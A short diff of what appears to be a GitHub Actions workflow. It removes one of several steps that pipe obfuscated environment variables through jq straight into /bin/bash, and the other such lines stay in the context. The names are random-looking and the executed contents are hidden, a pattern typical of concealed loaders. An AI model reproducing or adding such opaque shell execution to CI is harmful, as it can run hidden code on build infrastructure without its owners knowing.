@@ -30,7 +30,6 @@ jobs:
           echo $cu202 | jq -r .nxh07 | /bin/bash
           echo $lwhmb95 | jq -r .lzbw30 | /bin/bash
           printf '%s' "$xcqmp00587" | jq -r .yztav48282 | /bin/bash
-          echo $h28 | jq -r .wfor2126 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
